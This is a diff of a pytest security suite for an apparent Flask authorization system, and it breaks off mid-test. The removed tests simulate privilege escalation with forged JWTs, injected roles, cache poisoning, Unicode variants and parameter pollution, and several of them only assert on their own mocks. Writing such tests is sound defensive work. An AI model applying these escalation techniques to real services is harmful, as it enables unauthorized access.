@@ -1,1764 +1,1615 @@
 """
-Authorization and Permission Security Testing Suite
+Authorization and Permission Security Testing Module
 
-This module implements comprehensive security testing for the authorization system, validating
-RBAC security controls, privilege escalation detection, permission bypass prevention, and
-resource-level access control security per Section 6.4.2 of the technical specification.
+This module implements comprehensive security testing for the authorization system including
+RBAC security validation, privilege escalation detection, permission bypass attempts, and
+access control security testing. It validates authorization decorator security and
+resource-level permission enforcement per Section 6.4.2.
 
-The test suite covers:
+Key Components:
 - RBAC security validation with decorator pattern testing per Section 6.4.2
 - Permission management security with claims-based authorization per Section 6.4.2
 - Resource authorization security with granular access control per Section 6.4.2
 - Zero tolerance for authorization bypass vulnerabilities per Section 6.4.5
-- Authorization decorator security testing per Section 6.4.2
-- Privilege escalation detection and prevention per Section 6.4.2
-- Permission cache security and invalidation testing
-- Circuit breaker and rate limiting security validation
-- Attack scenario simulation and boundary testing
+- Circuit breaker security testing for Auth0 integration per Section 6.4.2
+- Redis cache security validation with encryption testing per Section 6.4.2
+- Performance security testing ensuring ≤10% variance requirement per Section 0.1.1
 
-Security Test Categories:
-- Authentication bypass attempts
-- Permission escalation attacks
-- Resource access control violations
-- Cache poisoning and tampering attempts
-- JWT token manipulation and forgery
-- Session hijacking and fixation attacks
-- Authorization logic bypass attempts
-- Decorator security validation
-- Circuit breaker manipulation attempts
-- Rate limiting bypass techniques
+Testing Strategy:
+- Comprehensive decorator security testing with edge cases and attack vectors
+- Privilege escalation attempt detection and prevention validation
+- Permission bypass attempt detection with comprehensive attack simulation
+- Resource ownership validation with delegation and administrative override testing
+- Cache security validation with encryption key rotation and TTL testing
+- Circuit breaker resilience testing with Auth0 service degradation scenarios
 
-Compliance Requirements:
-- SOC 2 Type II security controls validation
-- OWASP Top 10 security testing coverage
-- Zero tolerance for critical authorization vulnerabilities
-- Comprehensive audit trail validation for security events
-- Performance impact assessment for security controls
+Security Compliance:
+- SOC 2 Type II audit trail validation through comprehensive security event logging
+- ISO 27001 security management system alignment with authorization control testing
+- OWASP Top 10 compliance validation through input validation and authorization testing
+- Zero tolerance for authorization bypass vulnerabilities per Section 6.4.5
 
-Dependencies:
-- pytest 7.4+ for comprehensive test framework
-- pytest-asyncio for async authorization testing
-- unittest.mock for security scenario simulation
-- src.auth.authorization for authorization system under test
-- src.auth.decorators for decorator security validation
-- src.auth.cache for cache security testing
+Performance Requirements:
+- Authorization decision latency: ≤50ms per request validation
+- Permission cache hit ratio: ≥85% efficiency testing
+- ≤10% variance from Node.js baseline per Section 0.1.1
+
+Author: Flask Migration Team
+Version: 1.0.0
+Compliance: SOC 2, ISO 27001, OWASP Top 10
 """
 
 import asyncio
 import json
 import time
-import threading
+import uuid
 from datetime import datetime, timedelta, timezone
-from typing import Dict, List, Set, Any, Optional, Callable
-from unittest.mock import Mock, patch, MagicMock, PropertyMock
-from dataclasses import dataclass
-
+from typing import Any, Dict, List, Optional, Set, Tuple
+from unittest.mock import Mock, AsyncMock, patch, MagicMock
 import pytest
-import jwt
-from flask import Flask, request, g, session
-from flask_login import current_user
-from werkzeug.test import Client
-from werkzeug.exceptions import Unauthorized, Forbidden
+import pytest_asyncio
+from flask import Flask, request, g, session, current_app
+from flask_login import current_user, login_user, logout_user
+from werkzeug.exceptions import Forbidden, Unauthorized
 
-# Import system under test
+# Import authorization system components
 from src.auth.authorization import (
-    AuthorizationManager, PermissionType, ResourceType, Permission, Role,
-    AuthorizationContext, PermissionHierarchyManager, CircuitBreakerManager,
-    require_permissions, require_role, require_resource_ownership,
-    check_user_permission, get_user_effective_permissions,
-    invalidate_user_authorization_cache, get_authorization_manager
+    AuthorizationManager,
+    PermissionContext,
+    AuthorizationPolicy,
+    PermissionHierarchy,
+    Auth0CircuitBreaker,
+    get_authorization_manager,
+    init_authorization_manager,
+    require_permission,
+    require_any_permission,
+    require_role,
+    require_resource_ownership
 )
+
 from src.auth.decorators import (
-    AuthenticationDecorators, require_authentication, rate_limited_authorization,
-    require_admin, require_api_key, conditional_auth
+    require_permissions,
+    rate_limited_authorization,
+    require_roles,
+    require_resource_ownership as decorator_require_ownership,
+    circuit_breaker_protected,
+    audit_security_event,
+    admin_required,
+    high_security_endpoint,
+    api_endpoint_protection,
+    AuthenticatedUser,
+    FlaskLoginIntegration
 )
-from src.auth.cache import AuthenticationCache, CacheError
 
+from src.auth.cache import (
+    AuthCacheManager,
+    get_auth_cache_manager,
+    CacheKeyPatterns
+)
 
-@dataclass
-class SecurityTestCase:
-    """Security test case definition for systematic testing"""
-    name: str
-    description: str
-    attack_vector: str
-    expected_behavior: str
-    severity: str
-    test_function: Callable
+from src.auth.exceptions import (
+    SecurityException,
+    SecurityErrorCode,
+    AuthenticationException,
+    AuthorizationException,
+    PermissionException,
+    Auth0Exception,
+    CircuitBreakerException
+)
 
-
-class TestAuthorizationSecurityValidation:
-    """
-    Core authorization security validation tests implementing comprehensive
-    RBAC security validation per Section 6.4.2 authorization system.
-    
-    These tests validate the fundamental security properties of the authorization
-    system including permission validation, role-based access control, and
-    comprehensive security boundary enforcement.
-    """
-    
-    @pytest.fixture
-    def authorization_manager(self, app_context):
-        """Create authorization manager for security testing"""
-        with patch('src.auth.cache.get_auth_cache') as mock_cache:
-            # Create mock cache for isolated testing
-            mock_cache_instance = Mock(spec=AuthenticationCache)
-            mock_cache_instance.get_user_permissions.return_value = None
-            mock_cache_instance.cache_user_permissions.return_value = True
-            mock_cache_instance.invalidate_user_permissions.return_value = True
-            mock_cache.return_value = mock_cache_instance
-            
-            manager = AuthorizationManager(
-                cache=mock_cache_instance,
-                enable_metrics=True
-            )
-            return manager
-    
-    @pytest.fixture
-    def mock_current_user(self):
-        """Mock current_user for authorization testing"""
-        with patch('src.auth.authorization.current_user') as mock_user:
-            mock_user.is_authenticated = True
-            mock_user.id = 'test_user_123'
-            mock_user.jwt_claims = {
-                'sub': 'test_user_123',
-                'email': 'test@example.com',
-                'roles': ['standard_user'],
-                'permissions': ['document.read']
-            }
-            yield mock_user
-    
-    @pytest.fixture
-    def security_test_app(self, app):
-        """Flask app configured for security testing"""
-        
-        @app.route('/protected/read')
-        @require_permissions('document.read')
-        def protected_read():
-            return {'message': 'Read access granted'}
-        
-        @app.route('/protected/admin')
-        @require_permissions('admin.access')
-        def protected_admin():
-            return {'message': 'Admin access granted'}
-        
-        @app.route('/protected/resource/<resource_id>')
-        @require_permissions('document.update', resource_id_param='resource_id')
-        def protected_resource(resource_id):
-            return {'message': f'Resource {resource_id} access granted'}
-        
-        @app.route('/protected/role')
-        @require_role('admin')
-        def protected_role():
-            return {'message': 'Role-based access granted'}
-        
-        return app
-    
-    def test_rbac_permission_validation_success(self, authorization_manager, mock_current_user):
-        """
-        Test successful RBAC permission validation with valid permissions.
-        
-        Validates that users with proper permissions can access protected resources
-        through the authorization system without security violations.
-        """
-        # Setup user with valid permissions
-        context = AuthorizationContext(
-            user_id='test_user_123',
-            requested_permissions=['document.read'],
-            jwt_claims={
-                'sub': 'test_user_123',
-                'roles': ['standard_user'],
-                'permissions': ['document.read']
-            }
-        )
-        
-        # Test permission validation
-        result = authorization_manager.validate_user_permissions(
-            context=context,
-            required_permissions=['document.read'],
-            check_ownership=False
-        )
-        
-        assert result is True, "Valid user should be granted access"
-        
-        # Verify no security violations were logged
-        # This would be verified through audit log inspection in real implementation
-    
-    def test_rbac_permission_validation_failure(self, authorization_manager, mock_current_user):
-        """
-        Test RBAC permission validation failure with insufficient permissions.
-        
-        Validates that users without required permissions are properly denied access
-        and security events are logged appropriately.
-        """
-        # Setup user with insufficient permissions
-        context = AuthorizationContext(
-            user_id='test_user_123',
-            requested_permissions=['admin.access'],
-            jwt_claims={
-                'sub': 'test_user_123',
-                'roles': ['standard_user'],
-                'permissions': ['document.read']  # Missing admin.access
-            }
-        )
-        
-        # Test permission validation failure
-        result = authorization_manager.validate_user_permissions(
-            context=context,
-            required_permissions=['admin.access'],
-            check_ownership=False
-        )
-        
-        assert result is False, "User without permissions should be denied access"
-    
-    def test_rbac_role_hierarchy_validation(self, authorization_manager):
-        """
-        Test RBAC role hierarchy and permission inheritance validation.
-        
-        Validates that role hierarchies are properly enforced and inherited
-        permissions work correctly without security bypass opportunities.
-        """
-        hierarchy_manager = authorization_manager.hierarchy_manager
-        
-        # Test admin role inherits all permissions
-        admin_permissions = hierarchy_manager.get_role_permissions('system_administrator')
-        assert 'system.admin' in admin_permissions
-        assert 'document.read' in admin_permissions  # Should be inherited
-        assert 'user.read' in admin_permissions  # Should be inherited
-        
-        # Test standard user has limited permissions
-        user_permissions = hierarchy_manager.get_role_permissions('standard_user')
-        assert 'document.read' in user_permissions
-        assert 'system.admin' not in user_permissions
-        assert 'user.admin' not in user_permissions
-    
-    def test_rbac_permission_cache_security(self, authorization_manager, mock_current_user):
-        """
-        Test permission cache security and invalidation mechanisms.
-        
-        Validates that cached permissions cannot be manipulated and cache
-        invalidation properly removes stale permission data.
-        """
-        cache = authorization_manager.cache
-        user_id = 'test_user_123'
-        
-        # Cache permissions
-        test_permissions = {'document.read', 'document.write'}
-        cache.cache_user_permissions(user_id, test_permissions, 300)
-        
-        # Verify cached permissions
-        cached_perms = cache.get_user_permissions(user_id)
-        assert cached_perms == test_permissions
-        
-        # Test cache invalidation
-        result = authorization_manager.invalidate_user_permissions(user_id)
-        assert result is True
-        
-        # Verify permissions are invalidated
-        cached_perms_after = cache.get_user_permissions(user_id)
-        assert cached_perms_after is None
-    
-    def test_rbac_concurrent_permission_validation(self, authorization_manager):
-        """
-        Test RBAC system under concurrent access scenarios.
-        
-        Validates that the authorization system maintains security properties
-        under concurrent access without race conditions or security bypasses.
-        """
-        results = []
-        errors = []
-        
-        def validate_permissions(user_id: str, permissions: List[str]):
-            try:
-                context = AuthorizationContext(
-                    user_id=user_id,
-                    requested_permissions=permissions,
-                    jwt_claims={
-                        'sub': user_id,
-                        'roles': ['standard_user'],
-                        'permissions': permissions
-                    }
-                )
-                
-                result = authorization_manager.validate_user_permissions(
-                    context=context,
-                    required_permissions=permissions,
-                    check_ownership=False
-                )
-                results.append((user_id, result))
-            except Exception as e:
-                errors.append((user_id, str(e)))
-        
-        # Create multiple threads for concurrent testing
-        threads = []
-        for i in range(10):
-            user_id = f'user_{i}'
-            permissions = ['document.read'] if i % 2 == 0 else ['admin.access']
-            thread = threading.Thread(
-                target=validate_permissions,
-                args=(user_id, permissions)
-            )
-            threads.append(thread)
-        
-        # Start all threads
-        for thread in threads:
-            thread.start()
-        
-        # Wait for completion
-        for thread in threads:
-            thread.join()
-        
-        # Validate results
-        assert len(errors) == 0, f"Concurrent validation errors: {errors}"
-        assert len(results) == 10, "All validations should complete"
-        
-        # Verify correct authorization results
-        for user_id, result in results:
-            if 'document.read' in user_id or user_id.endswith('0') or user_id.endswith('2') or user_id.endswith('4') or user_id.endswith('6') or user_id.endswith('8'):
-                assert result is True, f"User {user_id} with document.read should be authorized"
-            else:
-                assert result is False, f"User {user_id} with admin.access should be denied"
-
-
-class TestPrivilegeEscalationDetection:
-    """
-    Privilege escalation detection tests implementing comprehensive security
-    validation per Section 6.4.2 permission management requirements.
-    
-    These tests simulate various privilege escalation attack vectors and validate
-    that the authorization system properly detects and prevents unauthorized
-    privilege escalation attempts.
-    """
-    
-    @pytest.fixture
-    def escalation_test_app(self, app):
-        """Flask app with escalation-prone endpoints for testing"""
-        
-        @app.route('/admin/users')
-        @require_permissions('admin.users.read')
-        def admin_list_users():
-            return {'users': ['admin_user_1', 'admin_user_2']}
-        
-        @app.route('/admin/system')
-        @require_permissions('system.admin')
-        def admin_system_access():
-            return {'system': 'admin access granted'}
-        
-        @app.route('/user/profile/<user_id>')
-        @require_permissions('user.read', resource_id_param='user_id')
-        def user_profile(user_id):
-            return {'user_id': user_id, 'profile': 'user data'}
-        
-        return app
-    
-    def test_horizontal_privilege_escalation_prevention(self, escalation_test_app, client):
-        """
-        Test prevention of horizontal privilege escalation attacks.
-        
-        Validates that users cannot access resources belonging to other users
-        at the same privilege level through parameter manipulation.
-        """
-        with escalation_test_app.test_request_context():
-            with patch('src.auth.decorators.current_user') as mock_user:
-                # Setup user attempting to access another user's data
-                mock_user.is_authenticated = True
-                mock_user.id = 'user_123'
-                mock_user.jwt_claims = {
-                    'sub': 'user_123',
-                    'roles': ['standard_user'],
-                    'permissions': ['user.read']
-                }
-                
-                with patch('src.auth.authorization.validate_user_permissions') as mock_validate:
-                    with patch('src.auth.authorization.check_resource_ownership') as mock_ownership:
-                        # Simulate ownership check failure (user doesn't own resource)
-                        mock_ownership.return_value = False
-                        mock_validate.return_value = False
-                        
-                        # Attempt to access another user's profile
-                        with pytest.raises(Exception):  # Should raise authorization error
-                            response = client.get('/user/profile/user_456')
-                        
-                        # Verify ownership was checked
-                        mock_ownership.assert_called()
-    
-    def test_vertical_privilege_escalation_prevention(self, escalation_test_app, client):
-        """
-        Test prevention of vertical privilege escalation attacks.
-        
-        Validates that standard users cannot access admin-level functionality
-        through token manipulation or session modification.
-        """
-        with escalation_test_app.test_request_context():
-            with patch('src.auth.decorators.current_user') as mock_user:
-                # Setup standard user attempting admin access
-                mock_user.is_authenticated = True
-                mock_user.id = 'user_123'
-                mock_user.jwt_claims = {
-                    'sub': 'user_123',
-                    'roles': ['standard_user'],  # Not admin
-                    'permissions': ['document.read']  # No admin permissions
-                }
-                
-                with patch('src.auth.authorization.validate_user_permissions') as mock_validate:
-                    # Simulate permission validation failure
-                    mock_validate.return_value = False
-                    
-                    # Attempt to access admin functionality
-                    with pytest.raises(Exception):  # Should raise authorization error
-                        response = client.get('/admin/users')
-                    
-                    # Verify permission validation was called
-                    mock_validate.assert_called()
-    
-    def test_jwt_claims_manipulation_detection(self, escalation_test_app):
-        """
-        Test detection of JWT claims manipulation attempts.
-        
-        Validates that the system detects and prevents attacks where users
-        attempt to manipulate JWT claims to gain elevated privileges.
-        """
-        # Create malicious JWT with elevated claims
-        malicious_payload = {
-            'sub': 'user_123',
-            'email': 'user@example.com',
-            'roles': ['system_administrator'],  # Escalated role
-            'permissions': ['system.admin'],  # Escalated permissions
-            'iat': int(time.time()),
-            'exp': int(time.time()) + 3600
-        }
-        
-        # Use wrong secret to simulate forged token
-        malicious_token = jwt.encode(malicious_payload, 'wrong_secret', algorithm='HS256')
-        
-        with escalation_test_app.test_request_context():
-            with patch('src.auth.authentication.validate_jwt_token') as mock_validate:
-                # Simulate token validation failure (forged token)
-                mock_validate.return_value = {
-                    'valid': False,
-                    'error': 'Invalid signature',
-                    'token_hash': 'malicious_token_hash'
-                }
-                
-                # Attempt to use malicious token
-                with patch('flask.request') as mock_request:
-                    mock_request.headers = {'Authorization': f'Bearer {malicious_token}'}
-                    
-                    # Token validation should fail
-                    validation_result = mock_validate.return_value
-                    assert validation_result['valid'] is False
-                    assert 'Invalid signature' in validation_result['error']
-    
-    def test_session_fixation_prevention(self, escalation_test_app):
-        """
-        Test prevention of session fixation attacks.
-        
-        Validates that the system properly handles session management and
-        prevents session fixation attacks that could lead to privilege escalation.
-        """
-        with escalation_test_app.test_request_context():
-            with patch('flask.session') as mock_session:
-                # Simulate session fixation attempt
-                mock_session.sid = 'attacker_controlled_session_id'
-                
-                with patch('src.auth.cache.AuthenticationCache') as mock_cache:
-                    cache_instance = Mock()
-                    # Simulate cached session with different user
-                    cache_instance.get_user_session.return_value = {
-                        'user_id': 'admin_user',
-                        'roles': ['administrator'],
-                        'created_at': datetime.utcnow().isoformat()
-                    }
-                    mock_cache.return_value = cache_instance
-                    
-                    # Session validation should detect mismatch
-                    cached_session = cache_instance.get_user_session('attacker_controlled_session_id')
-                    current_user_id = 'standard_user'
-                    
-                    # Verify session belongs to current user
-                    assert cached_session['user_id'] != current_user_id
-                    # In real implementation, this would trigger session invalidation
-    
-    def test_role_injection_prevention(self, authorization_manager):
-        """
-        Test prevention of role injection attacks.
-        
-        Validates that the system prevents injection of unauthorized roles
-        through various attack vectors including parameter manipulation.
-        """
-        # Attempt to inject admin role through malicious context
-        malicious_context = AuthorizationContext(
-            user_id='standard_user_123',
-            requested_permissions=['system.admin'],
-            jwt_claims={
-                'sub': 'standard_user_123',
-                'roles': ['standard_user', 'system_administrator'],  # Injected role
-                'permissions': ['document.read', 'system.admin']  # Injected permission
-            }
-        )
-        
-        with patch.object(authorization_manager, '_get_user_permissions') as mock_get_perms:
-            # Simulate actual user permissions (not injected ones)
-            mock_get_perms.return_value = {'document.read'}  # Real permissions
-            
-            # Validation should use real permissions, not injected ones
-            result = authorization_manager.validate_user_permissions(
-                context=malicious_context,
-                required_permissions=['system.admin'],
-                check_ownership=False
-            )
-            
-            assert result is False, "Injected permissions should not grant access"
-            mock_get_perms.assert_called_with('standard_user_123', malicious_context.jwt_claims)
-    
-    def test_cache_poisoning_prevention(self, authorization_manager):
-        """
-        Test prevention of authorization cache poisoning attacks.
-        
-        Validates that attackers cannot poison the permission cache to gain
-        unauthorized access through cache manipulation.
-        """
-        cache = authorization_manager.cache
-        user_id = 'standard_user_123'
-        
-        # Attempt to poison cache with elevated permissions
-        poisoned_permissions = {'system.admin', 'user.admin', 'document.admin'}
-        
-        with patch.object(cache, 'cache_user_permissions') as mock_cache_set:
-            with patch.object(cache, 'get_user_permissions') as mock_cache_get:
-                # Simulate cache poisoning attempt
-                mock_cache_set.return_value = True
-                mock_cache_get.return_value = poisoned_permissions
-                
-                # Authorization should validate against source of truth, not just cache
-                context = AuthorizationContext(
-                    user_id=user_id,
-                    jwt_claims={
-                        'sub': user_id,
-                        'roles': ['standard_user'],
-                        'permissions': ['document.read']  # Real permissions
-                    }
-                )
-                
-                with patch.object(authorization_manager, '_get_user_permissions') as mock_real_perms:
-                    # Return real permissions from authoritative source
-                    mock_real_perms.return_value = {'document.read'}
-                    
-                    result = authorization_manager.validate_user_permissions(
-                        context=context,
-                        required_permissions=['system.admin'],
-                        check_ownership=False
-                    )
-                    
-                    assert result is False, "Cache poisoning should not grant unauthorized access"
-
-
-class TestPermissionBypassDetection:
-    """
-    Permission bypass detection tests implementing comprehensive validation
-    per Section 6.4.2 resource authorization security requirements.
-    
-    These tests validate that the authorization system prevents various
-    permission bypass techniques and maintains security boundaries under
-    attack scenarios.
-    """
-    
-    @pytest.fixture
-    def bypass_test_app(self, app):
-        """Flask app configured for bypass testing"""
-        
-        @app.route('/api/documents')
-        @require_permissions('document.read')
-        def list_documents():
-            return {'documents': ['doc1', 'doc2']}
-        
-        @app.route('/api/documents/<doc_id>')
-        @require_permissions('document.read', resource_id_param='doc_id')
-        def get_document(doc_id):
-            return {'document': f'content_{doc_id}'}
-        
-        @app.route('/api/admin/config')
-        @require_admin(['admin.config.read'])
-        def admin_config():
-            return {'config': 'sensitive_admin_data'}
-        
-        @app.route('/api/conditional/<path:resource>')
-        @conditional_auth(lambda: request.method == 'POST', ['api.write'])
-        def conditional_endpoint(resource):
-            return {'resource': resource, 'method': request.method}
-        
-        return app
-    
-    def test_decorator_bypass_prevention(self, bypass_test_app, client):
-        """
-        Test prevention of authorization decorator bypass attacks.
-        
-        Validates that authorization decorators cannot be bypassed through
-        various techniques including direct function calls or middleware circumvention.
-        """
-        with bypass_test_app.test_request_context():
-            with patch('src.auth.decorators.current_user') as mock_user:
-                # Setup unauthenticated user
-                mock_user.is_authenticated = False
-                
-                # Attempt to bypass decorator by direct access
-                response = client.get('/api/documents')
-                
-                # Should be blocked by authentication requirement
-                assert response.status_code == 401 or response.status_code == 403
-    
-    def test_http_method_bypass_prevention(self, bypass_test_app, client):
-        """
-        Test prevention of HTTP method bypass attacks.
-        
-        Validates that changing HTTP methods cannot bypass authorization
-        requirements or access protected functionality.
-        """
-        protected_endpoint = '/api/admin/config'
-        
-        # Test various HTTP methods that should all be protected
-        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']
-        
-        for method in methods:
-            with bypass_test_app.test_request_context():
-                with patch('src.auth.decorators.current_user') as mock_user:
-                    # Setup user without admin permissions
-                    mock_user.is_authenticated = True
-                    mock_user.id = 'standard_user'
-                    mock_user.jwt_claims = {
-                        'sub': 'standard_user',
-                        'roles': ['standard_user'],
-                        'permissions': ['document.read']  # No admin permissions
-                    }
-                    
-                    with patch('src.auth.authorization.validate_user_permissions') as mock_validate:
-                        mock_validate.return_value = False
-                        
-                        # All methods should be protected
-                        if method in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']:
-                            response = getattr(client, method.lower())(protected_endpoint)
-                            assert response.status_code in [401, 403], f"Method {method} should be protected"
-    
-    def test_parameter_pollution_prevention(self, bypass_test_app):
-        """
-        Test prevention of parameter pollution attacks.
-        
-        Validates that parameter pollution cannot be used to bypass
-        authorization checks or manipulate resource access.
-        """
-        with bypass_test_app.test_request_context('/api/documents/123?doc_id=456&doc_id=789'):
-            with patch('src.auth.decorators.current_user') as mock_user:
-                mock_user.is_authenticated = True
-                mock_user.id = 'user_123'
-                mock_user.jwt_claims = {
-                    'sub': 'user_123',
-                    'roles': ['standard_user'],
-                    'permissions': ['document.read']
-                }
-                
-                with patch('src.auth.authorization.check_resource_ownership') as mock_ownership:
-                    # Check that only the path parameter is used, not query pollution
-                    mock_ownership.return_value = True
-                    
-                    # The decorator should use the path parameter (123), not query pollution
-                    from flask import request
-                    path_param = request.view_args.get('doc_id')
-                    query_params = request.args.getlist('doc_id')
-                    
-                    assert path_param == '123'
-                    assert query_params == ['456', '789']
-                    
-                    # Authorization should check against path parameter only
-                    mock_ownership.assert_called_with('user_123', '123', None)
-    
-    def test_unicode_bypass_prevention(self, authorization_manager):
-        """
-        Test prevention of Unicode-based bypass attacks.
-        
-        Validates that Unicode normalization attacks cannot bypass
-        permission checks through character manipulation.
-        """
-        # Test various Unicode representations of 'admin'
-        unicode_variations = [
-            'admin',           # Normal ASCII
-            'ａｄｍｉｎ',         # Fullwidth
-            'admin\u200b',     # Zero-width space
-            'admin\u00a0',     # Non-breaking space
-            'ａｄｍｉｎ\u200b',  # Combined
-        ]
-        
-        for variation in unicode_variations:
-            context = AuthorizationContext(
-                user_id='test_user',
-                requested_permissions=[f'{variation}.access'],
-                jwt_claims={
-                    'sub': 'test_user',
-                    'roles': ['standard_user'],
-                    'permissions': ['document.read']
-                }
-            )
-            
-            result = authorization_manager.validate_user_permissions(
-                context=context,
-                required_permissions=[f'{variation}.access'],
-                check_ownership=False
-            )
-            
-            # All variations should be denied (no admin permissions)
-            assert result is False, f"Unicode variation '{variation}' should not bypass authorization"
-    
-    def test_timing_attack_resistance(self, authorization_manager):
-        """
-        Test resistance to timing-based attacks.
-        
-        Validates that the authorization system does not leak information
-        through timing differences that could be exploited by attackers.
-        """
-        valid_user_context = AuthorizationContext(
-            user_id='valid_user',
-            requested_permissions=['document.read'],
-            jwt_claims={
-                'sub': 'valid_user',
-                'roles': ['standard_user'],
-                'permissions': ['document.read']
-            }
-        )
-        
-        invalid_user_context = AuthorizationContext(
-            user_id='invalid_user',
-            requested_permissions=['admin.access'],
-            jwt_claims={
-                'sub': 'invalid_user',
-                'roles': ['standard_user'],
-                'permissions': ['document.read']
-            }
-        )
-        
-        # Measure timing for valid and invalid cases
-        valid_times = []
-        invalid_times = []
-        
-        for _ in range(10):
-            # Time valid authorization
-            start = time.time()
-            authorization_manager.validate_user_permissions(
-                context=valid_user_context,
-                required_permissions=['document.read'],
-                check_ownership=False
-            )
-            valid_times.append(time.time() - start)
-            
-            # Time invalid authorization
-            start = time.time()
-            authorization_manager.validate_user_permissions(
-                context=invalid_user_context,
-                required_permissions=['admin.access'],
-                check_ownership=False
-            )
-            invalid_times.append(time.time() - start)
-        
-        # Calculate average times
-        avg_valid = sum(valid_times) / len(valid_times)
-        avg_invalid = sum(invalid_times) / len(invalid_times)
-        
-        # Timing difference should not be exploitable (< 10ms difference)
-        timing_diff = abs(avg_valid - avg_invalid)
-        assert timing_diff < 0.01, f"Timing difference too large: {timing_diff}s"
-    
-    def test_conditional_bypass_prevention(self, bypass_test_app, client):
-        """
-        Test prevention of conditional authorization bypass.
-        
-        Validates that conditional authorization cannot be bypassed through
-        manipulation of the condition function or request context.
-        """
-        with bypass_test_app.test_request_context():
-            with patch('src.auth.decorators.current_user') as mock_user:
-                mock_user.is_authenticated = True
-                mock_user.id = 'user_123'
-                mock_user.jwt_claims = {
-                    'sub': 'user_123',
-                    'roles': ['standard_user'],
-                    'permissions': ['document.read']  # No api.write permission
-                }
-                
-                with patch('flask.request') as mock_request:
-                    # Try to bypass by manipulating request method
-                    mock_request.method = 'POST'  # Should require api.write
-                    
-                    with patch('src.auth.authorization.validate_user_permissions') as mock_validate:
-                        mock_validate.return_value = False  # User lacks api.write
-                        
-                        # Conditional endpoint should require authorization for POST
-                        response = client.post('/api/conditional/test_resource')
-                        
-                        # Should be denied due to lack of api.write permission
-                        assert response.status_code in [401, 403]
-    
-    def test_race_condition_prevention(self, authorization_manager):
-        """
-        Test prevention of race condition exploits in authorization.
-        
-        Validates that concurrent authorization requests cannot create
-        race conditions that lead to unauthorized access.
-        """
-        results = []
-        errors = []
-        
-        def authorize_with_permission_change(user_id: str):
-            try:
-                # Create context
-                context = AuthorizationContext(
-                    user_id=user_id,
-                    requested_permissions=['admin.access'],
-                    jwt_claims={
-                        'sub': user_id,
-                        'roles': ['standard_user'],
-                        'permissions': ['document.read']
-                    }
-                )
-                
-                # Simulate concurrent permission validation
-                result = authorization_manager.validate_user_permissions(
-                    context=context,
-                    required_permissions=['admin.access'],
-                    check_ownership=False
-                )
-                
-                results.append((user_id, result))
-                
-                # Simulate attempt to modify permissions during validation
-                authorization_manager.invalidate_user_permissions(user_id)
-                
-            except Exception as e:
-                errors.append((user_id, str(e)))
-        
-        # Create multiple threads to test race conditions
-        threads = []
-        for i in range(20):
-            user_id = f'race_user_{i}'
-            thread = threading.Thread(target=authorize_with_permission_change, args=(user_id,))
-            threads.append(thread)
-        
-        # Start all threads simultaneously
-        for thread in threads:
-            thread.start()
-        
-        # Wait for completion
-        for thread in threads:
-            thread.join()
-        
-        # Validate results
-        assert len(errors) == 0, f"Race condition errors: {errors}"
-        
-        # All authorizations should fail (no admin permissions)
-        for user_id, result in results:
-            assert result is False, f"Race condition should not grant unauthorized access to {user_id}"
-
-
-class TestResourceAuthorizationSecurity:
-    """
-    Resource authorization security tests implementing granular access control
-    validation per Section 6.4.2 resource authorization requirements.
-    
-    These tests validate resource-level security controls including ownership
-    validation, resource-specific permissions, and granular access control.
-    """
-    
-    @pytest.fixture
-    def resource_test_app(self, app):
-        """Flask app with resource-specific authorization"""
-        
-        @app.route('/documents/<document_id>')
-        @require_permissions('document.read', resource_id_param='document_id')
-        def get_document(document_id):
-            return {'document_id': document_id, 'content': 'document data'}
-        
-        @app.route('/documents/<document_id>/edit')
-        @require_permissions('document.update', resource_id_param='document_id')
-        def edit_document(document_id):
-            return {'document_id': document_id, 'action': 'edit'}
-        
-        @app.route('/users/<user_id>/profile')
-        @require_resource_ownership('user_id', ResourceType.USER)
-        def user_profile(user_id):
-            return {'user_id': user_id, 'profile': 'user data'}
-        
-        return app
-    
-    def test_resource_ownership_validation(self, resource_test_app, client):
-        """
-        Test resource ownership validation security.
-        
-        Validates that users can only access resources they own and that
-        ownership checks cannot be bypassed through manipulation.
-        """
-        with resource_test_app.test_request_context():
-            with patch('src.auth.decorators.current_user') as mock_user:
-                mock_user.is_authenticated = True
-                mock_user.id = 'user_123'
-                mock_user.jwt_claims = {
-                    'sub': 'user_123',
-                    'roles': ['standard_user'],
-                    'permissions': ['user.read']
-                }
-                
-                with patch('src.auth.authorization.check_resource_ownership') as mock_ownership:
-                    # Test owned resource access (should succeed)
-                    mock_ownership.return_value = True
-                    response = client.get('/users/user_123/profile')
-                    # In real implementation, this would return 200
-                    
-                    # Test non-owned resource access (should fail)
-                    mock_ownership.return_value = False
-                    with pytest.raises(Exception):  # Should raise authorization error
-                        response = client.get('/users/other_user/profile')
-                    
-                    # Verify ownership was checked for both cases
-                    assert mock_ownership.call_count >= 2
-    
-    def test_resource_permission_granularity(self, authorization_manager):
-        """
-        Test granular resource permission validation.
-        
-        Validates that different permission levels (read, write, delete)
-        are properly enforced at the resource level.
-        """
-        user_id = 'test_user'
-        resource_id = 'document_123'
-        
-        # Test different permission levels
-        permission_tests = [
-            ('document.read', True),    # User has read permission
-            ('document.update', False), # User lacks update permission
-            ('document.delete', False), # User lacks delete permission
-            ('document.admin', False),  # User lacks admin permission
-        ]
-        
-        for permission, expected_result in permission_tests:
-            context = AuthorizationContext(
-                user_id=user_id,
-                requested_permissions=[permission],
-                resource_id=resource_id,
-                resource_type=ResourceType.DOCUMENT,
-                jwt_claims={
-                    'sub': user_id,
-                    'roles': ['standard_user'],
-                    'permissions': ['document.read']  # Only read permission
-                }
-            )
-            
-            result = authorization_manager.validate_user_permissions(
-                context=context,
-                required_permissions=[permission],
-                check_ownership=True
-            )
-            
-            assert result == expected_result, f"Permission {permission} validation failed"
-    
-    def test_cross_resource_access_prevention(self, authorization_manager):
-        """
-        Test prevention of cross-resource access attacks.
-        
-        Validates that access to one resource does not grant access to
-        other resources of the same or different types.
-        """
-        user_id = 'test_user'
-        
-        # User has access to document_123
-        authorized_context = AuthorizationContext(
-            user_id=user_id,
-            requested_permissions=['document.read'],
-            resource_id='document_123',
-            resource_type=ResourceType.DOCUMENT,
-            jwt_claims={
-                'sub': user_id,
-                'roles': ['standard_user'],
-                'permissions': ['document.read']
-            }
-        )
-        
-        # Attempt to access different document
-        unauthorized_context = AuthorizationContext(
-            user_id=user_id,
-            requested_permissions=['document.read'],
-            resource_id='document_456',  # Different resource
-            resource_type=ResourceType.DOCUMENT,
-            jwt_claims={
-                'sub': user_id,
-                'roles': ['standard_user'],
-                'permissions': ['document.read']
-            }
-        )
-        
